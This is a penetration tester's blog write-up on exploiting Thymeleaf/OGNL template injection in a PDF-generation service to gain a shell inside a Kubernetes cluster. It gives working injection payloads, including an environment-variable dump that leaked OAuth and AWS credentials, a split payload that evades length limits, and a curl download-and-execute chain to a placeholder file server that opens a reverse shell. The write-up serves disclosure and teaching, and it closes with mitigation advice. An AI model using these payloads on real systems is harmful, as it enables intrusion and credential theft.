# PDF generation to Java RCE.

Recently, I reviewed an application that was generating PDFs. The functionality worked by providing privileged users the ability to create templates, which were later rendered from a different endpoint used to provide the data to populate the PDF. Both sides of the functionality were found vulnerable to Server Side Template Injection, which led to RCE. The one that could be triggered by an unprivileged user though, was quite interesting since it came with some limitations regarding payload length, that made demonstrating impact quite difficult.

## How do web apps generate PDFs ?

Template engines were created to separate application logic from content displayed to the user. In other words dynamically generating HTML. Most applications I 've seen generating PDFs are essentially generating  HTML using template engines, which they later convert to a PDF file, using an [html-to-pdf](https://github.com/wooio/htmltopdf-java) converter. They finally serve the file to the user.

## Application Architecture

The application was an SPA which consumed a Spring Boot based API. Most API endpoints disclosed web-application names and the ports that they were running on, through [X-Application-Context](https://stackoverflow.com/questions/40379550/what-is-x-application-context-header) response header. After identifying a few different application names it was safe to assume that we were dealing with a microservice-based architecture.

```http
HTTP/1.1 200 
...
X-Application-Context: redacted-app:aws:9009
...
```

## Generating a PDF

To generate a PDF the user would select the pdf template from a list and data-analytics provided by the service. These data were used to populate the PDF along with template metadata and information from the user's profile. After posting the data, a URI was generated in order to query the status of the task.

* Processing
* Done (this came along with a URI pointing to location of the file)
* Error Message (Really useful during the exploitation phase)

The response containing the URI posed another information disclosure vulnerability, since it revealed an internal hostname among other things. The form of this hostname suggested that the application runs inside a Kubernetes Cluster.

```http
HTTP/1.1 200 
...
{
    "status" : "DONE",
    "pdfUri" : "http://pdf-generator.namespace:9010/files/{pdf_id}"
}
```

## Detection

To identify the vulnerability, I simply set `[[${6*7}]]` as my first name and generated a report. The pdf came back with [the answer to the ultimate question of life, the universe and everything on it](https://www.urbandictionary.com/define.php?term=42). Regarding the template engine, I just took an educated guess, that it would be Thymeleaf, since it is commonly used among Java Spring developers. I tried `[[${'abc'.toUpperCase()}]]` to confirm that RCE was possible. I was so happy when I saw the pdf coming back with `ABC` string where my `lastName` was placed.

## Limitations

As soon as I was sure that this is a valid SSTI, I started changing my user's first and last names to Thymeleaf and Java Expression Language payloads.

**Thymeleaf Engine Context and Java Expressions**

At first I tried some [Thymeleaf Expression Basic Objects](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#expression-basic-objects), from the documentation. *#request, #response, #session, #servletContext* objects rendered to nothing, so the according to the documentation this is not a Web Context, while *#ctx* leaked the unrendered template, along with the parameters passed to it. Pretty interesting, but not enough to demonstrate impact. 

Thymeleaf evaluates variable expressions (`${...}`), which are essentially some type of Java Expressions. If the web application is based on Spring, Thymeleaf uses Spring EL. If not, Thymeleaf uses OGNL. Since this is a Spring Boot Application we would expect the Template Engine to use SpringEL. Developers though do not do things by the book, which is why we find vulnerabilities in the first place. In this case though the template engine was not used to dynamically generate web pages, but pdfs and had no obvious reason to access web application context. OGNL payloads seemed to work, while SpringEL ones errored out. I can't guess whether or not this odd implementation was an conscious decision, or somebody blindly following a tutorial, not only did it *not* introduce security issues, it also made exploitation harder for two reasons. Web context (e.g. Spring beans) was inaccessible and OGNL expressions are somehow larger than their SpringEL equivalents.

​	*Disclaimer: I am by no means a Java expert, so please take my notes on contexts with a grain of salt. Feel free to contact me if you notice anything odd mentioned.*

**Payload Length**

While trying out payloads, I came to the realization that user's first and last name could be of approximately 45 characters each. A typical Java EL Command Execution payload length is more than 100 characters long, not counting special characters and the command executed. An idea came to me, to surpass this. First and last name appeared next to each other, within the template in this form. `lastName{space}firstName ` Maybe with some string concatenation, I could combine both injection points into a single payload. Class reflection payloads are still too long, but using OGNL specific syntax is promising. 

| Payload                                                      | Length |
| ------------------------------------------------------------ | ------ |
| [[${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("")}]] | 125    |
| [[${@java.lang.Runtime@getRuntime().exec("")}]]              | 47     |
| lastName = [[${@java.lang.Runtime@getRuntime().exec(""       | 43     |
| firstName = +"")}]]                                          | 7      |

## Exploitation

So far we know the following:

1. We are dealing with 2 applications, that live inside a Kubernetes Cluster:

   * One the user requests the pdf from, which forwards the request to the other.

   * One that performs the actual template rendering and returns the location of the file. (The vulnerable one)
2. We can tamper our user's first and last name, in order to attack the app.
3. Template engine is Thymeleaf
4. Expression Language used is OGNL
5. Max payload length is 45 chars and we can extend it by combining both injection points.

**Demonstating Impact**

A go-to for Java RCE payload is `[[${@java.lang.System@getenv()}]]`, which satisfies our length limitations. The pdf came back containing tons of internal cluster information and other sensitive information. The most impressive were Oauth credentials for privileged clients and AWS API keys. This was enough, to escalate the vulnerability to critical severity, but we want to get the holy grail of pentesting, a reverse shell, right ?

**Getting a shell**

First bash command I executed was `id` with `lastName firstName` set to `[[${@java.lang.Runtime@getRuntime().exec("" +"id")}]]` and guess what ?!

![javarce](assets/pdfjavarce.jpg)

Well payload length restrictions, don't allow us the luxury of `inputStreams` and other Java demons, but with this semi-blind command execution, we are good to go. Next thing I went for was a bash reverse shell [one-liner](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp), which executed without any errors, but got me no connection back. I concluded that something didn't really like all these special characters, especially `&`. I worked around this, by chaining a few commands to download and execute the one-liner as a script.

```bash
/bin/curl http://<fileserver>/s -o /tmp/s
/bin/chmod +x /tmp/s
/tmp/s
```

**Inside the Cluster**

3 pdf generations later, I got a shell within the K8s cluster. From here we can query and enumerate internal services such as `kube-dns`. There is also a potential way to [escalate privileges to Cluster Admin](https://blog.ropnop.com/attacking-default-installs-of-helm-on-kubernetes/), by abusing Helm's tiller-deploy  but that's out-of-scope and a story for another time.

```bash
# awesome off-the-land lookup
$ getent hosts kube-dns.kube-system.svc.cluster.local                                         
10.x.x.x	kube-dns.kube-system.svc.cluster.local
$ getent hosts tiller-deploy.kube-system.svc.cluster.local
10.x.x.x	tiller-deploy.kube-system.svc.cluster.local
```

**Template editor**

For the template editor, mentioned earlier the exploitation was pretty straight-forward and will not be explained in detail. I just created a template with the following code in it and generated the pdf. The only extra thing I did was to use `waitFor()`, to ensure command chain is executed in the right order and no race conditions arise.

```
 [[${
@java.lang.Runtime@getRuntime().exec('curlXhttp://<fileserver>/sX-oX/tmp/s'.split('X')).waitFor(), @java.lang.Runtime@getRuntime().exec('chmodX+xX/tmp/s'.split('X')).waitFor(), @java.lang.Runtime@getRuntime().exec('bashX-cX/tmp/s'.split('X')).waitFor()
 }]]
```

## Conclusion

SSTI vulnerabilities are not something new, in fact they have been researched in-depth by some of the most knowledgeable people in the field. I keep on mentioning pdfs, throughout this post, even though the bug has nothing to do with pdfs, to aim focus on where to look for SSTIs. Most online examples, use applications that have vulnerable HTTP parameters reflected into templates. Here we have an SSTI on a non-MVC application, which is kind of odd. If you are dealing with an application that allows you to dynamically generate pdfs or fancy footers for email notifications, chances are there is some template rendering involved. Anyways, so far I found RCEs on Java based application really intimidating, but now I can understand them better. The bottom line is; avoid generating and modifying templates, from user supplied data. If business requirements dictate so, there are [things you can do](https://portswigger.net/web-security/server-side-template-injection#how-to-prevent-server-side-template-injection-vulnerabilities), but are quite hard to implement. 

## References

[Acunetix: Exploiting Thymeleaf SSTI](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

[Server-Side Template Injection: RCE For The Modern Web App](https://www.youtube.com/watch?v=3cT0uE7Y87s)

[Java EL Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#expression-language-el)



[Back](https://gian2dchris.github.io/)